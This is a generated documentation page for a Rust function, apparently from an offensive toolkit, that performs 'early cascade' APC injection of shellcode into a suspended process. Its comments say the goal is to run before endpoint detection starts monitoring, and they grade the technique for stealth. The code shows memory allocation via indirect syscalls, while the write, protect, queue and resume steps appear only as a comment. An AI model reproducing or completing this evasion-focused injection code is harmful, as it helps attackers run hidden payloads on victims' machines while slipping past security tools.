# early_cascade_injection

| Field | Value |
|-------|-------|
| **Source** | `source-extracts/early_cascade_injection.rs` |
| **Lines** | 42 |
| **Unsafe blocks** | 1 |

## Internal Functions

- `cascade_inject_into` (unsafe) (line 17)

## Full Source

```rust
// Source: dark_crystal/crowd/src/early_cascade.rs
// Technique: T007-early-cascade (Pre-LdrInitializeThunk APC Injection)
// Tier: S | OPSEC: 9.5
//
// Injects shellcode via NtQueueApcThread BEFORE ntdll!LdrInitializeThunk completes.
// The APC fires during the initialization cascade — before CRT init, before TLS
// callbacks, before any DLL_PROCESS_ATTACH. EDR has not begun monitoring yet.
//
// All 6 steps use pure NT syscalls via RecycledGate:
//   1. CreateProcess(CREATE_SUSPENDED)
//   2. NtAllocateVirtualMemory (RW)
//   3. NtWriteVirtualMemory
//   4. NtProtectVirtualMemory (RW → RX, W^X compliant)
//   5. NtQueueApcThread (not QueueUserAPC — no Win32 telemetry)
//   6. NtResumeThread

unsafe fn cascade_inject_into(
    h_proc_raw: usize,
    h_thread_raw: usize,
    shellcode: &[u8],
    pid: u32,
) -> anyhow::Result<u32> {
    let mut remote_addr: *mut c_void = null_mut();
    let mut region_size = shellcode.len();

    // Step 2: NtAllocateVirtualMemory via RecycledGate
    let status = crate::recycled::nt_allocate_virtual_memory(
        h_proc_raw, &mut remote_addr, 0,
        &mut region_size, MEM_COMMIT_RESERVE, PAGE_READWRITE,
    );

    if status < 0 || remote_addr.is_null() {
        crate::recycled::nt_terminate_process(h_proc_raw, 1);
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
        anyhow::bail!("NtAllocateVirtualMemory failed (0x{:08x})", status as u32);
    }

    // Steps 3-6: write, protect, queue APC, resume
    // ... all via RecycledGate indirect syscalls
    Ok(pid)
}

```